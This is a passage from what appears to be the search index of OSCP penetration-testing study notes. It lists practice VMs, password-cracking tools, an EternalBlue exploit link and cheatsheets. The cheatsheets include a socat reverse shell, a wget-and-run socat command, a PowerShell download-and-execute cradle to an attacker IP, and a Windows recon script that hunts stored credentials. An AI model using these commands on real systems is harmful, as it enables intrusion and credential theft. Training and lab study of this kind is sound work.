SickOS1.2 SkyTower Pinky\u2019s Palace /dev/random: scream pWnOS Metasploitable 1 Metasploitable 2 Lin.Security Temple of Doom Pinky\u2019s Palace v1 Pinky\u2019s Palace v2 Pinky\u2019s Palace v3 Pinky\u2019s Palace v4 zico2 Windows Hack The Box Metasploitable 3 - https://github.com/rapid7/metasploitable3/wiki https://github.com/magnetikonline/linuxmicrosoftievirtualmachines /dev/random: Sleepy - https://www.vulnhub.com/entry/devrandom-sleepy,123/ Bobby: 1 - https://www.vulnhub.com/entry/bobby-1,42/","title":"Practice"},{"location":"certifications/oscp/practice-vulnhub/#practice","text":"","title":"Practice"},{"location":"certifications/oscp/practice-vulnhub/#beginner-friendly","text":"","title":"Beginner friendly"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-1","text":"","title":"Kioptrix 1"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-2","text":"","title":"Kioptrix 2"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-3","text":"","title":"Kioptrix 3"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-4","text":"","title":"Kioptrix 4"},{"location":"certifications/oscp/practice-vulnhub/#intermediate","text":"","title":"Intermediate"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-5","text":"","title":"Kioptrix 5"},{"location":"certifications/oscp/practice-vulnhub/#kioptrix-2014","text":"","title":"Kioptrix 2014"},{"location":"certifications/oscp/practice-vulnhub/#brainpan-1","text":"","title":"Brainpan 1"},{"location":"certifications/oscp/practice-vulnhub/#mrrobot","text":"","title":"MrRobot"},{"location":"certifications/oscp/practice-vulnhub/#vulnix","text":"","title":"Vulnix"},{"location":"certifications/oscp/practice-vulnhub/#unknown-complexity","text":"","title":"Unknown Complexity"},{"location":"certifications/oscp/practice-vulnhub/#fristileaks","text":"","title":"FristiLeaks"},{"location":"certifications/oscp/practice-vulnhub/#stapler","text":"","title":"Stapler"},{"location":"certifications/oscp/practice-vulnhub/#pwnlab","text":"","title":"PwnLab"},{"location":"certifications/oscp/practice-vulnhub/#vulnos","text":"","title":"VulnOS"},{"location":"certifications/oscp/practice-vulnhub/#wintermute","text":"","title":"Wintermute"},{"location":"certifications/oscp/practice-vulnhub/#sickos12","text":"","title":"SickOS1.2"},{"location":"certifications/oscp/practice-vulnhub/#skytower","text":"","title":"SkyTower"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace","text":"","title":"Pinky\u2019s Palace"},{"location":"certifications/oscp/practice-vulnhub/#devrandom-scream","text":"","title":"/dev/random: scream"},{"location":"certifications/oscp/practice-vulnhub/#pwnos","text":"","title":"pWnOS"},{"location":"certifications/oscp/practice-vulnhub/#metasploitable-1","text":"","title":"Metasploitable 1"},{"location":"certifications/oscp/practice-vulnhub/#metasploitable-2","text":"","title":"Metasploitable 2"},{"location":"certifications/oscp/practice-vulnhub/#linsecurity","text":"","title":"Lin.Security"},{"location":"certifications/oscp/practice-vulnhub/#temple-of-doom","text":"","title":"Temple of Doom"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v1","text":"","title":"Pinky\u2019s Palace v1"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v2","text":"","title":"Pinky\u2019s Palace v2"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v3","text":"","title":"Pinky\u2019s Palace v3"},{"location":"certifications/oscp/practice-vulnhub/#pinkys-palace-v4","text":"","title":"Pinky\u2019s Palace v4"},{"location":"certifications/oscp/practice-vulnhub/#zico2","text":"","title":"zico2"},{"location":"certifications/oscp/practice-vulnhub/#windows","text":"Hack The Box Metasploitable 3 - https://github.com/rapid7/metasploitable3/wiki https://github.com/magnetikonline/linuxmicrosoftievirtualmachines /dev/random: Sleepy - https://www.vulnhub.com/entry/devrandom-sleepy,123/ Bobby: 1 - https://www.vulnhub.com/entry/bobby-1,42/","title":"Windows"},{"location":"certifications/oscp/y-Tools/","text":"Tools OSCP Collections http://downloads.kali.org/pwk-kali-vm.7z https://github.com/xapax/oscp Linux Explainshell - http://www.explainshell.com/ Script - Store shell history as a script - https://manpages.debian.org/testing/bsdutils/script.1.en.html Immunity Debugger and Mona. Mona part found at https://github.com/corelan/mona Networking Netcat - Ncat - Wireshark - TCPdump - Enumeration http://0daysecurity.com/penetration-testing/enumeration.html Google dorks Whois Netcraft Recon-ng Password Attacks Hydra - http://sectools.org/tool/hydra/ JTR - https://github.com/magnumripper/JohnTheRipper Medusa - https://en.kali.tools/?p=200 https://crackstation.net/ https://hashkiller.co.uk/ http://md5decrypt.net/en/Ntlm/","title":"Tools"},{"location":"certifications/oscp/y-Tools/#tools","text":"","title":"Tools"},{"location":"certifications/oscp/y-Tools/#oscp-collections","text":"http://downloads.kali.org/pwk-kali-vm.7z https://github.com/xapax/oscp","title":"OSCP Collections"},{"location":"certifications/oscp/y-Tools/#linux","text":"Explainshell - http://www.explainshell.com/ Script - Store shell history as a script - https://manpages.debian.org/testing/bsdutils/script.1.en.html Immunity Debugger and Mona. Mona part found at https://github.com/corelan/mona","title":"Linux"},{"location":"certifications/oscp/y-Tools/#networking","text":"Netcat - Ncat - Wireshark - TCPdump -","title":"Networking"},{"location":"certifications/oscp/y-Tools/#enumeration","text":"http://0daysecurity.com/penetration-testing/enumeration.html Google dorks Whois Netcraft Recon-ng","title":"Enumeration"},{"location":"certifications/oscp/y-Tools/#password-attacks","text":"Hydra - http://sectools.org/tool/hydra/ JTR - https://github.com/magnumripper/JohnTheRipper Medusa - https://en.kali.tools/?p=200 https://crackstation.net/ https://hashkiller.co.uk/ http://md5decrypt.net/en/Ntlm/","title":"Password Attacks"},{"location":"certifications/oscp/cheatsheet/0-cheatsheet/","text":"Cheatsheets Common Ports: http://packetlife.net/media/library/23/common_ports.pdf","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/0-cheatsheet/#cheatsheets","text":"Common Ports: http://packetlife.net/media/library/23/common_ports.pdf","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/exploits/","text":"MS17-010 (EternalBlue) https://github.com/3ndG4me/AutoBlue-MS17-010","title":"Exploits"},{"location":"certifications/oscp/cheatsheet/exploits/#ms17-010-eternalblue","text":"https://github.com/3ndG4me/AutoBlue-MS17-010","title":"MS17-010 (EternalBlue)"},{"location":"certifications/oscp/cheatsheet/share-files/","text":"Over SMB On Kali impacket-smbserver test1 `pwd` On Victim \\\\10.10.14.9\\test1\\test.exe","title":"Share files"},{"location":"certifications/oscp/cheatsheet/share-files/#over-smb","text":"On Kali impacket-smbserver test1 `pwd` On Victim \\\\10.10.14.9\\test1\\test.exe","title":"Over SMB"},{"location":"certifications/oscp/cheatsheet/tty/","text":"TTY Cheatsheets https://netsec.ws/?p=337 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell web ttys https://github.com/maxmcd/webtty python python -c 'import pty; pty.spawn( /bin/bash )' socat On Kali (listen): socat file:`tty`,raw,echo=0 tcp-listen:4444 On Victim (launch): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 netcat Send nc to background Check the term name and size on local machine with: echo $TERM stty -a stty raw -echo fg to being nc back up reset export SHELL=bash xterm export TERM=xterm stty rows 38 columns 116 Row and column values are found using stty -a . https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/","title":"TTY"},{"location":"certifications/oscp/cheatsheet/tty/#tty","text":"","title":"TTY"},{"location":"certifications/oscp/cheatsheet/tty/#cheatsheets","text":"https://netsec.ws/?p=337 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell","title":"Cheatsheets"},{"location":"certifications/oscp/cheatsheet/tty/#web-ttys","text":"https://github.com/maxmcd/webtty","title":"web ttys"},{"location":"certifications/oscp/cheatsheet/tty/#python","text":"python -c 'import pty; pty.spawn( /bin/bash )'","title":"python"},{"location":"certifications/oscp/cheatsheet/tty/#socat","text":"On Kali (listen): socat file:`tty`,raw,echo=0 tcp-listen:4444 On Victim (launch): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444","title":"socat"},{"location":"certifications/oscp/cheatsheet/tty/#netcat","text":"Send nc to background Check the term name and size on local machine with: echo $TERM stty -a stty raw -echo fg to being nc back up reset export SHELL=bash xterm export TERM=xterm stty rows 38 columns 116 Row and column values are found using stty -a . https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/","title":"netcat"},{"location":"certifications/oscp/cheatsheet/web/","text":"Web Scaning Droopescan: SilverStripe Wordpress, Joomla, Moodle, Drupal: https://github.com/droope/droopescan","title":"Web"},{"location":"certifications/oscp/cheatsheet/web/#web","text":"","title":"Web"},{"location":"certifications/oscp/cheatsheet/web/#scaning","text":"Droopescan: SilverStripe Wordpress, Joomla, Moodle, Drupal: https://github.com/droope/droopescan","title":"Scaning"},{"location":"certifications/oscp/cheatsheet/windows/","text":"Windows General cat = type Powershell echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/PowerUp.ps1')) | powershell -noprofile - Services List all: sc query state= all Prev Escalation PowerUp.ps1 Sherlock.ps1","title":"Windows"},{"location":"certifications/oscp/cheatsheet/windows/#windows","text":"","title":"Windows"},{"location":"certifications/oscp/cheatsheet/windows/#general","text":"cat = type","title":"General"},{"location":"certifications/oscp/cheatsheet/windows/#powershell","text":"echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/PowerUp.ps1')) | powershell -noprofile -","title":"Powershell"},{"location":"certifications/oscp/cheatsheet/windows/#services","text":"List all: sc query state= all","title":"Services"},{"location":"certifications/oscp/cheatsheet/windows/#prev-escalation","text":"PowerUp.ps1 Sherlock.ps1","title":"Prev Escalation"},{"location":"certifications/oscp/cheatsheet/enumeration/network/","text":"Scan for hosts nmap -sn $iprange -oG - | grep Up | cut -d' ' -f2 network.txt Port scanning TCP Top 1000: nmap -Pn -sC -sV -oA tcp -vv $ip All TCP Ports: nmap -Pn -sC -sV -oA all -vv -p- $ip UDP Top 100: nmap -Pn -sU --top-ports 100 -oA udp -vv $ip","title":"Network"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#scan-for-hosts","text":"nmap -sn $iprange -oG - | grep Up | cut -d' ' -f2 network.txt","title":"Scan for hosts"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#port-scanning","text":"","title":"Port scanning"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#tcp-top-1000","text":"nmap -Pn -sC -sV -oA tcp -vv $ip","title":"TCP Top 1000:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#all-tcp-ports","text":"nmap -Pn -sC -sV -oA all -vv -p- $ip","title":"All TCP Ports:"},{"location":"certifications/oscp/cheatsheet/enumeration/network/#udp-top-100","text":"nmap -Pn -sU --top-ports 100 -oA udp -vv $ip","title":"UDP Top 100:"},{"location":"certifications/oscp/cheatsheet/enumeration/vulnerability/","text":"Search searchsploit --exclude=dos -t apache 2.2.3 msfconsole; search apache 2.2.3","title":"Vulnerability"},{"location":"certifications/oscp/cheatsheet/enumeration/vulnerability/#search","text":"searchsploit --exclude=dos -t apache 2.2.3 msfconsole; search apache 2.2.3","title":"Search"},{"location":"certifications/oscp/cheatsheet/enumeration/windows-local/","text":"localrecon.cmd https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd @echo off REM REM This software is provided under under the BSD 3-Clause License. REM See the accompanying LICENSE file for more information. REM REM Utility to generate a summary of a Windows system REM REM Author: REM Arris Huijgen (@_bitsadmin) REM REM Website: REM https://github.com/bitsadmin/ REM REM TODO: REM * Check drives other than C:\\ (if available) REM * Add commandline parameter to perform a brief check or more extended REM * Make sure that the output of this script is not again included in the output REM REM Some more (untested) commands: REM pushd C:\\ ^ ^ findstr /I /N /S /P /R flag password secret confidential account payroll credit record * ^ ^ popd REM dir C:\\ /S /O-D /TW ^| findstr /C: Directory of /C: %d% !;! REM dir C:\\ /a-r-d /s /b REM To add: for /F tokens=2* delims= %%i in ('sc query ^| find /I ce_name ') do @sc qc %i %j REM setlocal enabledelayedexpansion set o= %tmp%\\recon%random%.out set d=-12-2016 REM Define a separator character (!;!) (set ;=^ %=Do not remove this line=% ) set t[0][name]=Basic 1 set t[0]=COMPUTERNAME!;!USERDNSDOMAIN!;!USERNAME!;!HOMEDRIVE!;!HOMEPATH set t[1][name]=Basic 2 set t[1]=systeminfo!;!wmic logicaldisk get caption,description,drivetype,providername,volumename ^| more set t[2][name]=Users set t[2]=query session!;!net user!;!net localgroup Administrators!;!net user Administrator!;!tree /F C:\\Users !;!dir /s /b /A:H C:\\Users\\ ^|find /V desktop.ini !;!tree /F C:\\Documents and Settings !;!dir /s /b /A:H C:\\Documents and Settings\\ ^|find /V desktop.ini set t[3][name]=Network set t[3]=ipconfig /all!;!route print!;!arp -a!;!netstat -ano!;!net session ^| find \\\\ !;!net view!;!netsh advfirewall show allprofiles!;!netsh firewall show state!;!netsh firewall show config!;!nltest /dclist: set t[4][name]=Processes, services and tasks set t[4]=wmic PROCESS get Processid,Caption,Commandline ^| more!;!query process *!;!tasklist /SVC!;!net start!;!DRIVERQUERY /V!;!schtasks /query /fo LIST /v!;!at!;!dir /B C:\\WINDOWS\\Tasks!;!set ^| find /V t[ set t[5][name]=Patch-level set t[5]=wmic qfe get Caption,Description,HotFixID,InstalledOn ^| more set t[6][name]=Base image configuration files set t[6]=dir /s /b C:\\sysprep.inf C:\\sysprep.xml C:\\unattend.txt C:\\Unattended.xml C:\\Services.xml C:\\ScheduledTasks.xml C:\\Printers.xml C:\\Drives.xml C:\\DataSources.xml set t[7][name]=Configuration set t[7]=reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated!;!reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated!;!reg query HKLM\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits!;!reg query HKLM\\System\\CurrentControlSet\\Services\\NfsServer\\Parameters\\SafeSetUidGidBits!;!gpresult /z set t[8][name]=Credentials set t[8]=cmdkey /list!;!dir /s /b /a:-D C:\\*pass* C:\\*cred* C:\\*vnc* C:\\*.config* C:\\*.kdb*!;!findstr /si password *.xml *.ini *.txt *.ps1 *.cmd!;!reg query HKLM /f password /t REG_SZ /s!;!reg query HKCU /f password /t REG_SZ /s!;!reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /V Default* set t[9][name]=Remote Desktop applications and VPN set t[9]=dir /b /s C:\\*vnc.ini!;!reg query HKCU\\SOFTWARE\\ORL\\WinVNC3\\Password!;!dir /s /b C:\\*.rdp C:\\*.pbk!;!reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions!;!reg query HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers /s set t[9][name]=Configuration 2 set t[9]=wmic service get name,displayname,pathname,startmode^|findstr /i Auto ^|findstr /i /v C:\\Windows\\\\ ^|findstr /i /v set t[10][name]=Files set t[10]=dir /S /A /B C:\\network-secret.txt C:\\proof.txt C:\\local.txt C:\\*.vsd* C:\\*flag* C:\\*password* C:\\*bank* C:\\*competit* C:\\*finance* C:\\*invoice* C:\\*risk* C:\\*key* C:\\*.pcf C:\\*.crt C:\\*.key C:\\*.log ^| find /V /I %SystemRoot%\\winsxs\\ ^| find /I /V %SystemRoot%\\Microsoft.NET\\ set t[11][name]=E-mail and documents set t[11]=dir /S /A /B *.dbx *.wab *.doc *.docx *.xlsx set t[12][name]=Pre-installed languages set t[12]=where python!;!where perl!;!where ruby!;!dir /s /b C:\\python.exe C:\\pythonw.exe C:\\perl.exe C:\\ruby.exe C:\\rubyw.exe C:\\bash.exe C:\\java.exe C:\\javaw.exe C:\\php.exe C:\\powershell.exe set last=12 :: CMD variables echo --------------- [0/%last%] %t[0][name]% --------------- %o% 2 1 echo --------------- [0/%last%] %t[0][name]% --------------- FOR /F %%i IN ( !t[0]! ) DO ( echo =^ %%~i echo %%i: !%%i! %o% 2 1 ) :: Commands FOR /L %%n IN (1,1,%last%) DO ( echo. %o% 2 1 echo. %o% 2 1 echo --------------- [%%n/%last%] !t[%%n][name]! --------------- %o% 2 1 echo. echo --------------- [%%n/%last%] !t[%%n][name]! --------------- FOR /F delims=; %%i IN ( !t[%%n]! ) DO ( set c=%%~i echo =^ !c! %o% 2 1 echo =^ !c! REM If command does not contain a pipe, execute directly REM Otherwise execute using cmd /c IF !c!==!c:^|=! ( !c! %o% 2 1 ) ELSE ( cmd /C !c! %o% 2 1 ) echo. %o% 2 1 echo. %o% 2 1 ) ) REM Results echo. echo Done. Results in %o%.","title":"Windows local"},{"location":"certifications/oscp/cheatsheet/enumeration/windows-local/#localreconcmd","text":"https://github.com/bitsadmin/miscellaneous/blob/master/localrecon.cmd @echo off REM REM This software is provided under under the BSD 3-Clause License. REM See the accompanying LICENSE file for more information. REM REM Utility to generate a summary of a Windows system REM REM Author: REM Arris Huijgen (@_bitsadmin) REM REM Website: REM https://github.com/bitsadmin/ REM REM TODO: REM * Check drives other than C:\\ (if available) REM * Add commandline parameter to perform a brief check or more extended REM * Make sure that the output of this script is not again included in the output REM REM Some more (untested) commands: REM pushd C:\\ ^ ^ findstr /I /N /S /P /R flag password secret confidential account payroll credit record * ^ ^ popd REM dir C:\\ /S /O-D /TW ^| findstr /C: Directory of /C: %d% !;! REM dir C:\\ /a-r-d /s /b REM To add: for /F tokens=2* delims= %%i in ('sc query ^| find /I ce_name ') do @sc qc %i %j REM setlocal enabledelayedexpansion set o= %tmp%\\recon%random%.out set d=-12-2016 REM Define a separator character (!;!) (set ;=^ %=Do not remove this line=% ) set t[0][name]=Basic 1 set t[0]=COMPUTERNAME!;!USERDNSDOMAIN!;!USERNAME!;!HOMEDRIVE!;!HOMEPATH set t[1][name]=Basic 2 set t[1]=systeminfo!;!wmic logicaldisk get caption,description,drivetype,providername,volumename ^| more set t[2][name]=Users set t[2]=query session!;!net user!;!net localgroup Administrators!;!net user Administrator!;!tree /F C:\\Users !;!dir /s /b /A:H C:\\Users\\ ^|find /V desktop.ini !;!tree /F C:\\Documents and Settings !;!dir /s /b /A:H C:\\Documents and Settings\\ ^|find /V desktop.ini set t[3][name]=Network set t[3]=ipconfig /all!;!route print!;!arp -a!;!netstat -ano!;!net session ^| find \\\\ !;!net view!;!netsh advfirewall show allprofiles!;!netsh firewall show state!;!netsh firewall show config!;!nltest /dclist: set t[4][name]=Processes, services and tasks set t[4]=wmic PROCESS get Processid,Caption,Commandline ^| more!;!query process *!;!tasklist /SVC!;!net start!;!DRIVERQUERY /V!;!schtasks /query /fo LIST /v!;!at!;!dir /B C:\\WINDOWS\\Tasks!;!set ^| find /V t[ set t[5][name]=Patch-level set t[5]=wmic qfe get Caption,Description,HotFixID,InstalledOn ^| more set t[6][name]=Base image configuration files set t[6]=dir /s /b C:\\sysprep.inf C:\\sysprep.xml C:\\unattend.txt C:\\Unattended.xml C:\\Services.xml C:\\ScheduledTasks.xml C:\\Printers.xml C:\\Drives.xml C:\\DataSources.xml set t[7][name]=Configuration set t[7]=reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated!;!reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated!;!reg query HKLM\\System\\CurrentControlSet\\Services\\NfsSvr\\Parameters\\SafeSetUidGidBits!;!reg query HKLM\\System\\CurrentControlSet\\Services\\NfsServer\\Parameters\\SafeSetUidGidBits!;!gpresult /z set t[8][name]=Credentials set t[8]=cmdkey /list!;!dir /s /b /a:-D C:\\*pass* C:\\*cred* C:\\*vnc* C:\\*.config* C:\\*.kdb*!;!findstr /si password *.xml *.ini *.txt *.ps1 *.cmd!;!reg query HKLM /f password /t REG_SZ /s!;!reg query HKCU /f password /t REG_SZ /s!;!reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /V Default* set t[9][name]=Remote Desktop applications and VPN set t[9]=dir /b /s C:\\*vnc.ini!;!reg query HKCU\\SOFTWARE\\ORL\\WinVNC3\\Password!;!dir /s /b C:\\*.rdp C:\\*.pbk!;!reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions!;!reg query HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers /s set t[9][name]=Configuration 2 set t[9]=wmic service get name,displayname,pathname,startmode^|findstr /i Auto ^|findstr /i /v C:\\Windows\\\\ ^|findstr /i /v set t[10][name]=Files set t[10]=dir /S /A /B C:\\network-secret.txt C:\\proof.txt C:\\local.txt C:\\*.vsd* C:\\*flag* C:\\*password* C:\\*bank* C:\\*competit* C:\\*finance* C:\\*invoice* C:\\*risk* C:\\*key* C:\\*.pcf C:\\*.crt C:\\*.key C:\\*.log ^| find /V /I %SystemRoot%\\winsxs\\ ^| find /I /V %SystemRoot%\\Microsoft.NET\\ set t[11][name]=E-mail and documents set t[11]=dir /S /A /B *.dbx *.wab *.doc *.docx *.xlsx set t[12][name]=Pre-installed languages set t[12]=where python!;!where perl!;!where ruby!;!dir /s /b C:\\python.exe C:\\pythonw.exe C:\\perl.exe C:\\ruby.exe C:\\rubyw.exe C:\\bash.exe C:\\java.exe C:\\javaw.exe C:\\php.exe C:\\powershell.exe set last=12 :: CMD variables echo --------------- [0/%last%] %t[0][name]% --------------- %o% 2 1 echo --------------- [0/%last%] %t[0][name]% --------------- FOR /F %%i IN ( !t[0]! ) DO ( echo =^ %%~i echo %%i: !%%i! %o% 2 1 ) :: Commands FOR /L %%n IN (1,1,%last%) DO ( echo. %o% 2 1 echo. %o% 2 1 echo --------------- [%%n/%last%] !t[%%n][name]! --------------- %o% 2 1 echo. echo --------------- [%%n/%last%] !t[%%n][name]! --------------- FOR /F delims=; %%i IN ( !t[%%n]! ) DO ( set c=%%~i echo =^ !c! %o% 2 1 echo =^ !c! REM If command does not contain a pipe, execute directly REM Otherwise execute using cmd /c IF !c!==!c:^|=! ( !c! %o% 2 1 ) ELSE ( cmd /C !c! %o% 2 1 ) echo. %o% 2 1 echo. %o% 2 1 ) ) REM Results echo. echo Done. Results in %o%.","title":"localrecon.cmd"},{"location":"cloud/aws-s3/","text":"New References S3 Book: https://github.com/nagwww/aws-s3-book Collections https://github.com/nagwww/101-AWS-S3-Hacks Hack : Add ACL to an Object. Grant Read privilages to the bucket using canonical user id Hack : Add ACL to an object. Grant Read privilages to the bucket using email address Hack : Add ACL to the bucket. Grant Read privilages to the bucket using canonical user id Hack : Add ACL to the bucket. Grant Read privilages to the bucket using email address Hack : Add a tag to S3 bucket Hack : Add lifecycle to S3 Folder Hack : Add lifecycle to S3 bucket Hack : Add lifecycle to S3 bucket, set the effective date. Don't specify the time or specify GMT midnight Hack : Add lifecycle to S3 bucket, set the effective days Hack : Check if a key exists Hack : Compute MD5 for an S3 object Hack : Configure this bucket to act as a website Hack : Convert an existing key in an S3 bucket that uses the STANDARD to RRS Hack : Copy the current key to a different Bucket Hack : Copy the current key to a different Bucket with Reduced Redundancy Storage (RRS) Hack : Create a Bucket in S3 Hack : Create a S3 bucket in a different region EU Hack : Create a folder in a S3 bucket Hack : Create a new object in S3 Hack : Delete a S3 bucket Hack : Delete a s3 object Hack : Delete all cors for the s3 bucket Hack : Delete all files in a folder Hack : Delete lifecycle to S3 bucket Hack : Delete tags of a S3 bucket Hack : Disable Logging for the S3 bucket Hack : Disable a buckets Versioning Hack : Disable a lifecycle to S3 bucket Hack : Download a S3 file or a S3 object Hack : Download a file using the method get_file Hack : Enable Logging for the S3 bucket Hack : Enable Versioning Hack : Find out the status of the Bucket Versioning Hack : Generate a URL for the S3 bucket with an expiration time 20 seconds Hack : Generate a URL for the S3 object with expiration of 5 min Hack : Get CORS for an S3 bucket Hack : Get CORS for an S3 bucket as xml Hack : Get a metadata value name 'name' added to the S3 object Hack : Get all the S3 regions Hack : Get all the metadata added to the S3 object Hack : Get all the versions of the S3 Objects Hack : Get an expiry date of a key/object in S3 Hack : Get lifecycle to S3 bucket Hack : Get lifecycle to S3 bucket as xml Hack : Get status of the restore of an object from glacier Hack : Get the ACL of the S3 bucket Hack : Get the ACL of the object Hack : Get the ACL of the object as xml Hack : Get the Location of the s3 bucket Hack : Get the bucket Policy Hack : Get the canonical user id of the S3 bucket Hack : Get the content type of object. Note only works with get_key Hack : Get the contents of the object as a string Hack : Get the get_xml_acl of an S3 object Hack : Get the redirect for an S3 object Hack : Get the tags of a S3 bucket Hack : Get the website configuration for this s3 bucket Hack : Get the website configuration in xml for this s3 bucket Hack : Get the website_endpoint of a s3 bucket Hack : How to add an exception Hack : How to enable debugging for S3 Hack : List all the S3 buckets Hack : List all the grants for a given Bucket Hack : List all the objects Owner Hack : List all the objects in a S3 bucket Hack : List all the objects last modified timestamp in Zulu format Hack : List all the objects size in bytes Hack : List all the objects with in a bucket Hack : List all the objects with in a bucket and if the object is moved to Glacier Hack : List all the objects with in a bucket with a prefix Hack : List all the objects with the versions for a given Bucket Hack : List whether the object is encrypted while at rest on the server Hack : Logging status for the S3 bucket Hack : Make S3 bucket public readable Hack : Make a http connection to S3 instead of https Hack : Make an object public Hack : Move s3 objects to Glacier Hack : Move s3 objects to Glacier add a Expiration Hack : Restore an object from glacier Hack : Search for bucket in a different AWS Region Hack : Search for a bucket with bucket name which is case sensitive Hack : Search for a specific bucket Hack : Set a canned ACL for object, authenticated-read Hack : Set a canned ACL for object, canned_bucket_owner_full_control Hack : Set a canned ACL for object, canned_bucket_owner_read Hack : Set a canned ACL for object, public read Hack : Set a canned ACL for object, public read write Hack : Set a canned ACL, authenticated-read Hack : Set a canned ACL, private Hack : Set a canned ACL, public-read Hack : Set a canned ACL, public-read-write Hack : Set a private canned ACL for an object Hack : Set a redirect for an S3 object Hack : Set metadata for a new s3 object on creation Hack : Set set_request_payment for a bucket Hack : Set the bucket Policy Hack : Set the meta data for an object Hack : Set up CORS for an S3 bucket Hack : Upload a file to S3 bucket using method initiate_multipart_upload. Note should be 5MB Hack : Upload a file to S3 bucket using method set_contents_from_filename Hack : Upload a file to s3 bucket using the method send_file","title":"Aws s3"},{"location":"cloud/aws-s3/#new-references","text":"S3 Book: https://github.com/nagwww/aws-s3-book","title":"New References"},{"location":"cloud/aws-s3/#collections","text":"https://github.com/nagwww/101-AWS-S3-Hacks Hack : Add ACL to an Object. Grant Read privilages to the bucket using canonical user id Hack : Add ACL to an object. Grant Read privilages to the bucket using email address Hack : Add ACL to the bucket. Grant Read privilages to the bucket using canonical user id Hack : Add ACL to the bucket. Grant Read privilages to the bucket using email address Hack : Add a tag to S3 bucket Hack : Add lifecycle to S3 Folder Hack : Add lifecycle to S3 bucket Hack : Add lifecycle to S3 bucket, set the effective date. Don't specify the time or specify GMT midnight Hack : Add lifecycle to S3 bucket, set the effective days Hack : Check if a key exists Hack : Compute MD5 for an S3 object Hack : Configure this bucket to act as a website Hack : Convert an existing key in an S3 bucket that uses the STANDARD to RRS Hack : Copy the current key to a different Bucket Hack : Copy the current key to a different Bucket with Reduced Redundancy Storage (RRS) Hack : Create a Bucket in S3 Hack : Create a S3 bucket in a different region EU Hack : Create a folder in a S3 bucket Hack : Create a new object in S3 Hack : Delete a S3 bucket Hack : Delete a s3 object Hack : Delete all cors for the s3 bucket Hack : Delete all files in a folder Hack : Delete lifecycle to S3 bucket Hack : Delete tags of a S3 bucket Hack : Disable Logging for the S3 bucket Hack : Disable a buckets Versioning Hack : Disable a lifecycle to S3 bucket Hack : Download a S3 file or a S3 object Hack : Download a file using the method get_file Hack : Enable Logging for the S3 bucket Hack : Enable Versioning Hack : Find out the status of the Bucket Versioning Hack : Generate a URL for the S3 bucket with an expiration time 20 seconds Hack : Generate a URL for the S3 object with expiration of 5 min Hack : Get CORS for an S3 bucket Hack : Get CORS for an S3 bucket as xml Hack : Get a metadata value name 'name' added to the S3 object Hack : Get all the S3 regions Hack : Get all the metadata added to the S3 object Hack : Get all the versions of the S3 Objects Hack : Get an expiry date of a key/object in S3 Hack : Get lifecycle to S3 bucket Hack : Get lifecycle to S3 bucket as xml Hack : Get status of the restore of an object from glacier Hack : Get the ACL of the S3 bucket Hack : Get the ACL of the object Hack : Get the ACL of the object as xml Hack : Get the Location of the s3 bucket Hack : Get the bucket Policy Hack : Get the canonical user id of the S3 bucket Hack : Get the content type of object. Note only works with get_key Hack : Get the contents of the object as a string Hack : Get the get_xml_acl of an S3 object Hack : Get the redirect for an S3 object Hack : Get the tags of a S3 bucket Hack : Get the website configuration for this s3 bucket Hack : Get the website configuration in xml for this s3 bucket Hack : Get the website_endpoint of a s3 bucket Hack : How to add an exception Hack : How to enable debugging for S3 Hack : List all the S3 buckets Hack : List all the grants for a given Bucket Hack : List all the objects Owner Hack : List all the objects in a S3 bucket Hack : List all the objects last modified timestamp in Zulu format Hack : List all the objects size in bytes Hack : List all the objects with in a bucket Hack : List all the objects with in a bucket and if the object is moved to Glacier Hack : List all the objects with in a bucket with a prefix Hack : List all the objects with the versions for a given Bucket Hack : List whether the object is encrypted while at rest on the server 